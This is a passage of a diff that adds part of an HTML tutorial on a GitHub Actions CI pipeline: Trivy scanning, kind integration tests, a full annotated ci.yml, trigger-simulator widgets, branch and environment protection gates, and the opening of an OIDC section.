+      <li><strong>Not exploitable in your context and no fix?</strong> Record a time-boxed exception (Trivy supports an ignore file) with a justification — never silently lower the gate.</li>
+    </ol>
+    <div class="callout warn"><span class="label">Scanners are not proof of safety</span>A clean scan means "no <em>known</em> vulnerabilities in packages the scanner recognised". It says nothing about your app's logic, secrets baked into layers (Trivy's default scanners include <code>secret</code>, which helps), or zero-days.</div>
+
+    <!-- ============================================================ -->
+    <h2>kind in CI: integration testing on a real Kubernetes API</h2>
+    <p><strong>Problem it solves.</strong> Unit tests and <code>docker run</code> can't catch: a Service <code>targetPort</code> that doesn't match 8000, a readiness probe on the wrong path, a manifest with a typo the API server rejects, an image that crashes under the non-root securityContext. kind (Kubernetes-in-Docker, Module 06) starts a real cluster inside the runner's Docker in about a minute.</p>
+    <p><strong><code>helm/kind-action@v1</code></strong> installs kind + kubectl and creates a cluster. Inputs we use: <code>cluster_name</code> (default <code>chart-testing</code> — we set <code>reliability-lab</code>), <code>wait</code> (default <code>60s</code>, how long to wait for the control plane). Others include <code>version</code> (kind version, README default v0.33.0), <code>config</code> (path to a kind config file), <code>node_image</code>, <code>kubectl_version</code>. Linux runners are supported for cluster creation (it needs Docker with Linux containers). Equivalent with the plain CLI: <code>kind create cluster --name reliability-lab --wait 60s</code>.</p>
+
+    <figure class="diagram">
+      <svg viewBox="0 0 860 300" role="img" aria-label="Sequence of the kind-integration job inside one runner VM">
+        <defs><marker id="m99" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="10" width="840" height="280" rx="12" class="zone"/>
+        <text x="24" y="32" class="t-bold">runner VM (ubuntu-latest) — Docker daemon</text>
+        <rect x="30" y="50" width="250" height="220" rx="10" class="box3"/>
+        <text x="42" y="72" class="t-bold">kind node container</text><text x="42" y="90" class="t-muted">reliability-lab-control-plane</text>
+        <rect x="46" y="104" width="218" height="40" rx="6" class="box"/><text x="155" y="129" text-anchor="middle">API server + kubelet</text>
+        <rect x="46" y="154" width="104" height="44" rx="6" class="box4"/><text x="98" y="174" text-anchor="middle" class="t-muted">Pod</text><text x="98" y="190" text-anchor="middle" class="t-muted">api :8000</text>
+        <rect x="160" y="154" width="104" height="44" rx="6" class="box4"/><text x="212" y="174" text-anchor="middle" class="t-muted">Pod</text><text x="212" y="190" text-anchor="middle" class="t-muted">api :8000</text>
+        <rect x="46" y="210" width="218" height="40" rx="6" class="box2"/><text x="155" y="235" text-anchor="middle">Service reliability-api :80</text>
+        <g>
+          <rect x="330" y="50" width="500" height="30" rx="6" class="box"/><text x="342" y="70" class="t-mono">1  docker load -i image.tar</text>
+          <rect x="330" y="88" width="500" height="30" rx="6" class="box"/><text x="342" y="108" class="t-mono">2  kind load docker-image $IMAGE --name reliability-lab</text>
+          <rect x="330" y="126" width="500" height="30" rx="6" class="box"/><text x="342" y="146" class="t-mono">3  kubectl apply -f deploy/kubernetes/ ; set image</text>
+          <rect x="330" y="164" width="500" height="30" rx="6" class="box"/><text x="342" y="184" class="t-mono">4  kubectl rollout status … --timeout=180s</text>
+          <rect x="330" y="202" width="500" height="30" rx="6" class="box"/><text x="342" y="222" class="t-mono">5  port-forward svc 8080:80 ; curl /ready /work</text>
+          <rect x="330" y="240" width="500" height="30" rx="6" class="box3"/><text x="342" y="260" class="t-mono">6  if: failure() → describe, logs, kind export logs</text>
+        </g>
+        <path d="M326 103 H284" class="line accent" marker-end="url(#m99)"/>
+        <path d="M326 141 H284" class="line accent" marker-end="url(#m99)"/>
+        <path d="M326 217 C300 217 300 230 268 230" class="line accent" marker-end="url(#m99)"/>
+      </svg>
+      <figcaption>Everything happens inside one runner: the image is side-loaded into the kind node (no registry needed), the real manifests are applied, and the test goes through the Service — the same path kube-proxy uses in production.</figcaption>
+    </figure>
+    <ul>
+      <li><strong>imagePullPolicy:</strong> the image is tagged with a SHA (not <code>:latest</code>), so the default pull policy is <code>IfNotPresent</code> and the side-loaded image is used. With <code>:latest</code> Kubernetes would try to pull from the internet and fail with <code>ErrImagePull</code>.</li>
+      <li><strong>Timeouts everywhere:</strong> <code>rollout status --timeout</code>, <code>curl --retry</code>, <code>timeout-minutes</code> on the job. A hung test that burns 6 hours of runner time is a failure of the pipeline design.</li>
+      <li><strong>Diagnostics on failure:</strong> the job dumps <code>kubectl get/describe</code>, Pod logs, events, and uploads <code>kind export logs</code> as an artifact — so a red run is debuggable without re-running.</li>
+    </ul>
+    <details class="q"><summary>Self-check: the kind job fails at <code>rollout status</code> with "deadline exceeded". Name three likely causes and where in the diagnostics artifact you'd look.</summary><div class="a">(1) Pods never become Ready: readiness probe path/port wrong or <code>READY_DELAY_SECONDS</code> longer than the timeout — <code>kubectl describe pod</code> events show "Readiness probe failed". (2) Image not found: <code>ErrImageNeverPull</code>/<code>ErrImagePull</code> because the tag in the Deployment doesn't match the loaded image — Pod events. (3) CrashLoopBackOff: app crashes (bad env, missing module) — <code>kubectl logs --previous</code>. Insufficient CPU for requests on the single node shows as <code>Pending</code> with a FailedScheduling event.</div></details>
+
+    <!-- ============================================================ -->
+    <h2>The complete <code>.github/workflows/ci.yml</code></h2>
+    <p>Assumed repository layout (from the study guide): <code>app/main.py</code> (canonical code), <code>app/tests/test_main.py</code>, <code>requirements.txt</code> (fastapi, uvicorn, prometheus-client), <code>requirements-dev.txt</code> (pytest, httpx, ruff), <code>Dockerfile</code> (Module 02), <code>deploy/kubernetes/</code> with <code>namespace.yaml</code>, <code>configmap.yaml</code>, <code>deployment.yaml</code> (container named <code>reliability-api</code>), <code>service.yaml</code> (Module 03/05). Adjust paths if your repo differs.</p>
+<pre data-title="app/tests/test_main.py — the unit tests the pipeline runs"><code>from fastapi.testclient import TestClient
+
+from app.main import app
+
+client = TestClient(app)
+
+
+def test_health():
+    r = client.get("/health")
+    assert r.status_code == 200
+    assert r.json() == {"status": "ok"}
+
+
+def test_ready_without_delay():
+    r = client.get("/ready")          # READY_DELAY_SECONDS defaults to 0
+    assert r.status_code == 200
+    assert r.json() == {"ready": True}
+
+
+def test_work_burns_requested_time():
+    r = client.get("/work", params={"ms": 5})
+    assert r.status_code == 200
+    assert r.json()["worked_ms"] &gt;= 5
+
+
+def test_metrics_exposes_counters():
+    client.get("/work", params={"ms": 1})
+    r = client.get("/metrics")
+    assert r.status_code == 200
+    assert "http_requests_total" in r.text</code></pre>
+
+<pre data-title=".github/workflows/ci.yml"><code>name: ci
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+# Least privilege: every job can only read the repo unless it says otherwise.
+permissions:
+  contents: read
+
+# One active run per branch/PR. Cancel superseded PR runs; never cancel main.
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+env:
+  IMAGE_REPO: ghcr.io/${{ github.repository_owner }}/reliability-api
+  KIND_CLUSTER: reliability-lab
+  NAMESPACE: reliability-lab
+
+jobs:
+  # ---------------------------------------------------------------- test
+  test:
+    name: test (py${{ matrix.python-version }})
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    strategy:
+      fail-fast: true
+      matrix:
+        python-version: ['3.12', '3.13']
+    steps:
+      # SECURITY: replace every @vN below with the full commit SHA + "# vN.x.y" comment.
+      - name: Check out code
+        uses: actions/checkout@v7
+        with:
+          persist-credentials: false
+
+      - name: Set up Python ${{ matrix.python-version }}
+        uses: actions/setup-python@v7
+        with:
+          python-version: ${{ matrix.python-version }}
+          cache: pip
+          cache-dependency-path: |
+            requirements.txt
+            requirements-dev.txt
+
+      - name: Install dependencies
+        run: python -m pip install -r requirements.txt -r requirements-dev.txt
+
+      - name: Lint
+        run: ruff check app
+
+      - name: Unit tests
+        run: python -m pytest -q app/tests --junitxml=reports/junit.xml
+
+      - name: Upload test report
+        if: ${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: junit-py${{ matrix.python-version }}
+          path: reports/
+          retention-days: 7
+
+  # --------------------------------------------------------------- build
+  build:
+    needs: test
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    outputs:
+      image: ${{ steps.meta.outputs.tags }}
+    steps:
+      - name: Check out code
+        uses: actions/checkout@v7
+        with:
+          persist-credentials: false
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v4
+
+      - name: Compute image tag and labels
+        id: meta
+        uses: docker/metadata-action@v6
+        with:
+          images: ${{ env.IMAGE_REPO }}
+          tags: |
+            type=sha,format=long,prefix=
+
+      - name: Build image (load into local Docker, do not push)
+        uses: docker/build-push-action@v7
+        with:
+          context: .
+          load: true
+          push: false
+          tags: ${{ steps.meta.outputs.tags }}
+          labels: ${{ steps.meta.outputs.labels }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: Smoke test the container
+        env:
+          IMAGE: ${{ steps.meta.outputs.tags }}
+        run: |
+          docker run -d --name smoke -p 8000:8000 "$IMAGE"
+          curl -fsS --retry 10 --retry-connrefused --retry-delay 1 http://localhost:8000/health
+          curl -fsS http://localhost:8000/ready
+          docker logs smoke
+          docker rm -f smoke
+
+      - name: Save image as tarball
+        env:
+          IMAGE: ${{ steps.meta.outputs.tags }}
+        run: docker save "$IMAGE" -o "${{ runner.temp }}/reliability-api.tar"
+
+      - name: Upload image artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: image
+          path: ${{ runner.temp }}/reliability-api.tar
+          retention-days: 1
+
+  # ---------------------------------------------------------------- scan
+  scan:
+    needs: build
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Download image artifact
+        uses: actions/download-artifact@v8
+        with:
+          name: image
+          path: ${{ runner.temp }}
+
+      - name: Load image
+        run: docker load -i "${{ runner.temp }}/reliability-api.tar"
+
+      - name: Scan image for HIGH/CRITICAL vulnerabilities
+        uses: aquasecurity/trivy-action@v0.36.0   # MUST be SHA-pinned (see CVE-2026-33634)
+        with:
+          image-ref: ${{ needs.build.outputs.image }}
+          severity: CRITICAL,HIGH
+          ignore-unfixed: true
+          exit-code: '1'
+
+  # ---------------------------------------------------- kind-integration
+  kind-integration:
+    needs: [build, scan]
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    env:
+      IMAGE: ${{ needs.build.outputs.image }}
+    steps:
+      - name: Check out code (manifests)
+        uses: actions/checkout@v7
+        with:
+          persist-credentials: false
+
+      - name: Download image artifact
+        uses: actions/download-artifact@v8
+        with:
+          name: image
+          path: ${{ runner.temp }}
+
+      - name: Load image into Docker
+        run: docker load -i "${{ runner.temp }}/reliability-api.tar"
+
+      - name: Create kind cluster
+        uses: helm/kind-action@v1
+        with:
+          cluster_name: ${{ env.KIND_CLUSTER }}
+          wait: 120s
+
+      - name: Side-load image into kind
+        run: kind load docker-image "$IMAGE" --name "$KIND_CLUSTER"
+
+      - name: Deploy reliability-api
+        run: |
+          kubectl apply -f deploy/kubernetes/namespace.yaml
+          kubectl apply -f deploy/kubernetes/
+          kubectl -n "$NAMESPACE" set image deployment/reliability-api reliability-api="$IMAGE"
+          kubectl -n "$NAMESPACE" rollout status deployment/reliability-api --timeout=180s
+
+      - name: Probe /ready and /work through the Service
+        run: |
+          kubectl -n "$NAMESPACE" port-forward svc/reliability-api 8080:80 &gt; "${{ runner.temp }}/pf.log" 2&gt;&amp;1 &amp;
+          curl -fsS --retry 15 --retry-connrefused --retry-delay 2 http://localhost:8080/ready
+          curl -fsS "http://localhost:8080/work?ms=20"
+          echo "### reliability-api ready in kind :white_check_mark:" &gt;&gt; "$GITHUB_STEP_SUMMARY"
+
+      - name: Collect diagnostics
+        if: ${{ failure() }}
+        run: |
+          echo "::group::kubectl get all"
+          kubectl -n "$NAMESPACE" get all -o wide || true
+          echo "::endgroup::"
+          echo "::group::describe pods"
+          kubectl -n "$NAMESPACE" describe pods || true
+          echo "::endgroup::"
+          echo "::group::events"
+          kubectl -n "$NAMESPACE" get events --sort-by=.lastTimestamp || true
+          echo "::endgroup::"
+          echo "::group::logs"
+          kubectl -n "$NAMESPACE" logs -l app.kubernetes.io/name=reliability-api --all-containers --tail=200 || true
+          echo "::endgroup::"
+          kind export logs "${{ runner.temp }}/kind-logs" --name "$KIND_CLUSTER" || true
+
+      - name: Upload kind logs
+        if: ${{ failure() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: kind-logs
+          path: ${{ runner.temp }}/kind-logs
+          retention-days: 7
+
+  # ------------------------------------------------------------- publish
+  publish:
+    needs: [build, kind-integration]
+    if: ${{ github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main' }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+      packages: write
+    env:
+      IMAGE: ${{ needs.build.outputs.image }}
+    steps:
+      - name: Download image artifact
+        uses: actions/download-artifact@v8
+        with:
+          name: image
+          path: ${{ runner.temp }}
+
+      - name: Load image
+        run: docker load -i "${{ runner.temp }}/reliability-api.tar"
+
+      - name: Log in to GHCR
+        uses: docker/login-action@v4
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Push the tested image
+        run: |
+          docker push "$IMAGE"
+          echo "Published \`$IMAGE\`" &gt;&gt; "$GITHUB_STEP_SUMMARY"</code></pre>
+
+    <h3>Line-by-line explanation</h3>
+    <div class="table-wrap"><table>
+      <tr><th>Lines</th><th>What it does</th><th>Why / failure it prevents</th></tr>
+      <tr><td><code>name: ci</code></td><td>Workflow name in the UI; status checks appear as <code>ci / &lt;job name&gt;</code>.</td><td>Stable names matter for required checks.</td></tr>
+      <tr><td><code>on.push.branches: [main]</code></td><td>Run on every push to main.</td><td>Feature-branch pushes don't double-run: they are tested through their PR.</td></tr>
+      <tr><td><code>on.pull_request.branches: [main]</code></td><td>Run for PRs targeting main (opened/synchronize/reopened).</td><td>Tests the <em>merge result</em> (<code>refs/pull/n/merge</code>), catching conflicts with main.</td></tr>
+      <tr><td><code>workflow_dispatch</code></td><td>Manual "Run workflow" button.</td><td>Re-run on demand, e.g. after a base-image CVE fix.</td></tr>
+      <tr><td><code>permissions: contents: read</code></td><td>Read-only default token for all jobs.</td><td>A compromised step can't push code or packages.</td></tr>
+      <tr><td><code>concurrency</code></td><td>Group per workflow + ref; cancel only PR runs.</td><td>Saves minutes on rapid PR pushes; every main commit still publishes.</td></tr>
+      <tr><td><code>env.IMAGE_REPO</code> …</td><td>Shared names: registry path, cluster, namespace (running-example names).</td><td>One place to change; no typos between jobs.</td></tr>
+      <tr><td><code>test.name: test (py…)</code></td><td>Check names like <code>test (py3.12)</code>.</td><td>Required checks reference these names.</td></tr>
+      <tr><td><code>timeout-minutes</code></td><td>Per-job cap.</td><td>A hung test can't burn hours.</td></tr>
+      <tr><td><code>strategy.matrix.python-version</code></td><td>Two parallel legs; <code>fail-fast</code> cancels the other leg on failure.</td><td>Early warning on the next Python; strings avoid YAML float bugs.</td></tr>
+      <tr><td><code>actions/checkout … persist-credentials: false</code></td><td>Clones the commit (<code>fetch-depth</code> 1 by default), doesn't keep the token.</td><td>Later steps (third-party code) can't reuse git credentials.</td></tr>
+      <tr><td><code>setup-python … cache: pip</code></td><td>Installs Python and restores pip cache keyed by the requirement files.</td><td>Faster installs; a changed requirements file busts the key.</td></tr>
+      <tr><td><code>pip install</code>, <code>ruff check</code>, <code>pytest --junitxml</code></td><td>Install, lint, test; JUnit XML for evidence.</td><td>Any non-zero exit fails the job → downstream skipped.</td></tr>
+      <tr><td><code>Upload test report if: !cancelled()</code></td><td>Uploads reports even when tests failed.</td><td>The failing report is the most useful one.</td></tr>
+      <tr><td><code>build.needs: test</code>, <code>outputs.image</code></td><td>Starts after both legs pass; exports the image ref.</td><td>No image is built from untested code.</td></tr>
+      <tr><td><code>setup-buildx-action</code></td><td>Creates a BuildKit builder.</td><td>Required for <code>type=gha</code> layer cache.</td></tr>
+      <tr><td><code>metadata-action … type=sha,format=long,prefix=</code></td><td>Tag = <code>ghcr.io/&lt;owner&gt;/reliability-api:&lt;40-char sha&gt;</code> + OCI labels (source, revision, created).</td><td>Every image traces to one commit; lower-cased automatically.</td></tr>
+      <tr><td><code>build-push-action load: true, push: false</code></td><td>Builds into the runner's Docker; nothing leaves the VM yet.</td><td>Untested images never reach the registry.</td></tr>
+      <tr><td><code>cache-from/to: type=gha</code></td><td>Reuse layers across runs.</td><td>Builds take seconds when only source changed.</td></tr>
+      <tr><td>Smoke test</td><td><code>docker run</code>, curl <code>/health</code> and <code>/ready</code> with retries, print logs.</td><td>Catches wrong CMD/port/missing files before the expensive kind job.</td></tr>
+      <tr><td><code>docker save</code> + upload <code>image</code> artifact (1 day)</td><td>Exports the image for other jobs.</td><td>Jobs run on different VMs; this is the hand-off.</td></tr>
+      <tr><td><code>scan</code>: download, load, trivy</td><td>Fails on fixable HIGH/CRITICAL CVEs (<code>exit-code: '1'</code>).</td><td>Default exit-code 0 would only print a report and never block.</td></tr>
+      <tr><td><code>kind-integration.needs: [build, scan]</code></td><td>Needs build for its output, scan for ordering.</td><td>Only deploy images that passed the scan.</td></tr>
+      <tr><td><code>helm/kind-action … cluster_name, wait</code></td><td>Creates cluster <code>reliability-lab</code>, waits up to 120 s for control plane.</td><td>Same cluster name as your laptop lab.</td></tr>
+      <tr><td><code>kind load docker-image</code></td><td>Copies the image into the kind node's containerd.</td><td>No registry credentials needed for the test cluster.</td></tr>
+      <tr><td><code>kubectl apply</code> + <code>set image</code> + <code>rollout status --timeout</code></td><td>Apply real manifests, point the Deployment at this exact image, wait for Ready replicas.</td><td>Readiness probes must pass → rollout completes; else timeout fails the step.</td></tr>
+      <tr><td>port-forward + <code>curl --retry</code></td><td>Calls <code>/ready</code> and <code>/work</code> through the Service.</td><td>Proves Service → Pod wiring (port 80 → 8000).</td></tr>
+      <tr><td><code>Collect diagnostics if: failure()</code></td><td>Grouped dumps of resources, describe, events, logs; <code>kind export logs</code>.</td><td>Debug without re-running; <code>|| true</code> keeps diagnostics from failing on partial state.</td></tr>
+      <tr><td><code>publish.if</code></td><td>Only <code>push</code> to <code>refs/heads/main</code>.</td><td>PRs (incl. forks) never publish; skipped job reports Success to checks.</td></tr>
+      <tr><td><code>publish.permissions</code></td><td>Adds <code>packages: write</code> (and keeps <code>contents: read</code>).</td><td>Only this job can write to GHCR.</td></tr>
+      <tr><td><code>login-action</code> with <code>GITHUB_TOKEN</code></td><td>Docker login to ghcr.io as <code>github.actor</code>.</td><td>No PAT stored anywhere.</td></tr>
+      <tr><td><code>docker push "$IMAGE"</code> + summary</td><td>Pushes the exact tested bytes; writes the ref on the run page.</td><td>Build once, promote the same image.</td></tr>
+    </table></div>
+    <div class="callout note"><span class="label">Why <code>${{ runner.temp }}</code> in <code>run:</code> is acceptable</span><code>runner.temp</code> is set by the runner, not by a PR author, so interpolating it is not an injection risk. Untrusted values (PR title, branch name) must go through <code>env:</code>.</div>
+
+    <!-- ============================================================ -->
+    <h2>Widget: trigger simulator</h2>
+    <p>Pick an event and branch; the simulator applies the <code>on:</code> filters and every job's <code>needs</code>/<code>if:</code> from the <code>ci.yml</code> above and tells you which jobs run, which are skipped, and why.</p>
+    <div class="widget" id="trigsim">
+      <div class="w-title">Which jobs run?</div>
+      <div class="w-sub">Model of the ci.yml in this module. "Branch" means the pushed branch (push), the base branch (pull_request), or the selected ref (workflow_dispatch).</div>
+      <div class="row">
+        <label style="margin:0">Event <select id="ts-event">
+          <option value="push">push</option>
+          <option value="pull_request" selected>pull_request</option>
+          <option value="workflow_dispatch">workflow_dispatch</option>
+          <option value="schedule">schedule</option>
+        </select></label>
+        <label style="margin:0">Branch <select id="ts-branch">
+          <option value="main" selected>main</option>
+          <option value="feature/ready-delay">feature/ready-delay</option>
+          <option value="release/1.x">release/1.x</option>
+        </select></label>
+        <label style="margin:0"><input type="checkbox" id="ts-fork"> PR from a fork</label>
+        <label style="margin:0"><input type="checkbox" id="ts-fail"> a unit test fails (py3.13)</label>
+      </div>
+      <div class="table-wrap"><table class="sim-table" id="ts-table"><tr><th>Job</th><th>Result</th><th>Reason</th></tr></table></div>
+      <div class="out" id="ts-out"></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <h2>Widget: pipeline run visualizer (fail-fast)</h2>
+    <p>Step through two runs of <code>ci.yml</code>: a push with a broken test, then the fix.</p>
+    <div class="widget stepper" data-steps='[
+      {"title":"Event: push to main","html":"A commit lands on <code>main</code>. GitHub matches <code>on.push.branches</code>, creates run #142 and resolves the job graph. Jobs with no <code>needs</code> (both matrix legs of <code>test</code>) are queued on fresh runners."},
+      {"title":"Matrix legs run in parallel","html":"<code>test (py3.12)</code> and <code>test (py3.13)</code> run simultaneously on two VMs: checkout, setup-python (pip cache restored), install, ruff, pytest."},
+      {"title":"py3.13 leg fails — fail-fast cancels py3.12","html":"A test asserts on behaviour that changed. pytest exits 1 → step fails → job fails. Because <code>fail-fast</code> is true, the still-running py3.12 leg is cancelled. The junit report of the failed leg is still uploaded (<code>if: !cancelled()</code>)."},
+      {"title":"Downstream jobs are skipped","html":"<code>build</code> needs <code>test</code>, which failed, so <code>build</code> is skipped; <code>scan</code>, <code>kind-integration</code> and <code>publish</code> cascade to skipped. No image was built, scanned, deployed or pushed. Time to red: about one test run."},
+      {"title":"Diagnose from the log","html":"<code>gh run view --log-failed</code> prints only failed steps. Download the <code>junit-py3.13</code> artifact for the report. Fix the code locally, run <code>python -m pytest</code>, push."},
+      {"title":"Fixed run: test → build → scan","html":"Run #143: both legs green → <code>build</code> builds with warm layer cache, smoke-tests, uploads the image tarball → <code>scan</code> finds no fixable HIGH/CRITICAL CVEs."},
+      {"title":"kind-integration and publish","html":"kind boots <code>reliability-lab</code>, the image is side-loaded, rollout completes, <code>/ready</code> returns 200 through the Service. <code>publish</code> (push to main) pushes <code>ghcr.io/&amp;lt;you&amp;gt;/reliability-api:&amp;lt;sha&amp;gt;</code>. Run is green."}
+    ]'>
+      <div class="w-title">Run visualizer</div>
+      <svg viewBox="0 0 860 220" role="img" aria-label="Pipeline jobs highlighted step by step">
+        <defs><marker id="m9s" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <g data-step="0"><rect x="10" y="80" width="90" height="50" rx="8" class="box3"/><text x="55" y="102" text-anchor="middle" class="t-bold">push</text><text x="55" y="120" text-anchor="middle" class="t-muted">main</text></g>
+        <g data-step="0,1,2,4,5"><rect x="130" y="30" width="130" height="50" rx="8" class="box2"/><text x="195" y="52" text-anchor="middle" class="t-bold">test py3.12</text><text x="195" y="70" text-anchor="middle" class="t-muted" data-step="2">cancelled</text></g>
+        <g data-step="0,1,2,4,5"><rect x="130" y="130" width="130" height="50" rx="8" class="box2"/><text x="195" y="152" text-anchor="middle" class="t-bold">test py3.13</text></g>
+        <g data-step="2,4"><circle cx="250" cy="140" r="9" class="dot-bad"/><text x="195" y="198" text-anchor="middle" class="t-muted">failed: pytest exit 1</text></g>
+        <g data-step="5"><circle cx="250" cy="40" r="9" class="dot-ok"/><circle cx="250" cy="140" r="9" class="dot-ok"/></g>
+        <g data-step="3,5"><rect x="300" y="80" width="110" height="50" rx="8" class="box2"/><text x="355" y="110" text-anchor="middle" class="t-bold">build</text></g>
+        <g data-step="3,5"><rect x="440" y="80" width="110" height="50" rx="8" class="box2"/><text x="495" y="110" text-anchor="middle" class="t-bold">scan</text></g>
+        <g data-step="3,6"><rect x="580" y="80" width="130" height="50" rx="8" class="box2"/><text x="645" y="110" text-anchor="middle" class="t-bold">kind-integration</text></g>
+        <g data-step="3,6"><rect x="740" y="80" width="110" height="50" rx="8" class="box4"/><text x="795" y="110" text-anchor="middle" class="t-bold">publish</text></g>
+        <g data-step="3"><text x="575" y="168" text-anchor="middle" class="t-bold">all skipped (needs not satisfied)</text></g>
+        <g data-step="6"><text x="795" y="160" text-anchor="middle" class="t-muted">ghcr.io/…:&lt;sha&gt;</text><circle cx="840" cy="88" r="7" class="dot-ok"/></g>
+        <path d="M100 100 C115 100 115 55 126 55" class="line" marker-end="url(#m9s)"/>
+        <path d="M100 110 C115 110 115 155 126 155" class="line" marker-end="url(#m9s)"/>
+        <path d="M260 55 C280 55 280 100 296 100" class="line" marker-end="url(#m9s)"/>
+        <path d="M260 155 C280 155 280 112 296 112" class="line" marker-end="url(#m9s)"/>
+        <path d="M410 105 H436" class="line" marker-end="url(#m9s)"/>
+        <path d="M550 105 H576" class="line" marker-end="url(#m9s)"/>
+        <path d="M710 105 H736" class="line" marker-end="url(#m9s)"/>
+      </svg>
+      <div class="stage"></div>
+      <div class="controls"><button class="btn" data-prev>◀ Prev</button><button class="btn primary" data-next>Next ▶</button><span class="count"></span></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <h2>Gates: required status checks, environments, reviewers</h2>
+    <figure class="diagram">
+      <svg viewBox="0 0 860 250" role="img" aria-label="Two gates: branch protection before merge and environment protection before deploy">
+        <defs><marker id="m9g" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="70" width="120" height="56" rx="8" class="box"/><text x="70" y="94" text-anchor="middle" class="t-bold">pull request</text><text x="70" y="112" text-anchor="middle" class="t-muted">feature → main</text>
+        <rect x="170" y="40" width="210" height="116" rx="10" class="box3"/><text x="275" y="62" text-anchor="middle" class="t-bold">GATE 1: branch protection</text><text x="184" y="86" class="t-muted">required checks green:</text><text x="184" y="104" class="t-mono">test (py3.12 / 3.13)</text><text x="184" y="122" class="t-mono">build · scan · kind</text><text x="184" y="142" class="t-muted">+ review approval, up to date</text>
+        <rect x="420" y="70" width="110" height="56" rx="8" class="box2"/><text x="475" y="94" text-anchor="middle" class="t-bold">merge</text><text x="475" y="112" text-anchor="middle" class="t-muted">push to main</text>
+        <rect x="570" y="70" width="110" height="56" rx="8" class="box4"/><text x="625" y="94" text-anchor="middle" class="t-bold">publish</text><text x="625" y="112" text-anchor="middle" class="t-muted">GHCR image</text>
+        <rect x="710" y="40" width="140" height="116" rx="10" class="box3"/><text x="780" y="62" text-anchor="middle" class="t-bold">GATE 2</text><text x="780" y="80" text-anchor="middle" class="t-bold">environment</text><text x="780" y="102" text-anchor="middle" class="t-muted">required reviewer</text><text x="780" y="120" text-anchor="middle" class="t-muted">wait timer, branch</text><text x="780" y="138" text-anchor="middle" class="t-muted">rules → then secrets</text>
+        <path d="M130 98 H166" class="line" marker-end="url(#m9g)"/><path d="M380 98 H416" class="line" marker-end="url(#m9g)"/><path d="M530 98 H566" class="line" marker-end="url(#m9g)"/><path d="M680 98 H706" class="line" marker-end="url(#m9g)"/>
+        <text x="780" y="186" text-anchor="middle" class="t-muted">deploy-gke job</text><text x="780" y="202" text-anchor="middle" class="t-muted">(Module 11)</text>
+        <text x="10" y="236" class="t-muted">Gate 1 protects the main branch's quality; gate 2 protects a running environment from an unapproved release.</text>
+      </svg>
+      <figcaption>Required status checks make CI <em>binding</em>; environment protection rules make deployment <em>deliberate</em>.</figcaption>
+    </figure>
+    <h3>Branch protection: required status checks</h3>
+    <p>In the repository's branch protection rule (or a ruleset) for <code>main</code>, enable <em>Require status checks to pass before merging</em> and select the job checks. A required check must end <em>successful, skipped or neutral</em>. <strong>Strict</strong> mode (the default when enabled) additionally requires the branch to be up to date with <code>main</code> — safer, but forces re-runs when main moves. Add "require a pull request before merging" with approvals for the human part.</p>
+    <ul>
+      <li>Make the integration test <em>required</em>; otherwise people merge on green unit tests while kind is red.</li>
+      <li>Don't require <code>publish</code> — it's skipped on PRs by design (it would report success anyway, but it isn't a quality signal).</li>
+      <li>Renaming a job renames its check: update the protection rule, or merges will wait for a check that never arrives.</li>
+    </ul>
+    <h3>Environments and deployment protection rules</h3>
+    <p>A job with <code>environment: production</code> deploys to that environment. Protection rules then apply <em>before the job starts</em>:</p>
+    <ul>
+      <li><strong>Required reviewers:</strong> up to six users/teams; only one needs to approve; optional "prevent self-review".</li>
+      <li><strong>Wait timer:</strong> 1 to 43,200 minutes (30 days) delay.</li>
+      <li><strong>Deployment branches and tags:</strong> only protected branches, or selected name patterns, may deploy.</li>
+      <li><strong>Environment secrets</strong> are only available to the job after the rules pass — a PR job can't read production credentials.</li>
+      <li>Availability: on GitHub Free/Pro/Team, required reviewers and wait timers are for public repositories (private repos need higher plans) — check the docs for your plan.</li>
+    </ul>
+<pre data-title="Preview: a gated deploy job (completed in Module 11)"><code><span class="k">deploy-gke</span>:
+  <span class="k">needs</span>: [build, publish]
+  <span class="k">runs-on</span>: ubuntu-latest
+  <span class="k">environment</span>: staging                 <span class="c"># required reviewer approves in the UI</span>
+  <span class="k">permissions</span>:
+    <span class="k">contents</span>: read
+    <span class="k">id-token</span>: write                    <span class="c"># OIDC token for Workload Identity Federation</span>
+  <span class="k">steps</span>:
+    - <span class="k">run</span>: echo "deploy ${{ needs.build.outputs.image }} with helm upgrade (Module 11)"</code></pre>
+
+    <!-- ============================================================ -->
+    <h2>OIDC: cloud access without stored keys</h2>
+    <p><strong>Problem.</strong> Deploying to GKE needs Google credentials. Storing a service-account JSON key as a GitHub secret creates a long-lived credential that can leak and must be rotated. <strong>OIDC</strong> replaces it: each job can request a short-lived, signed JWT from GitHub's OIDC provider; the cloud verifies the token's claims against a trust policy you configured and returns short-lived cloud credentials.</p>
+    <figure class="diagram">
+      <svg viewBox="0 0 860 230" role="img" aria-label="OIDC token exchange between GitHub Actions job and Google Cloud">
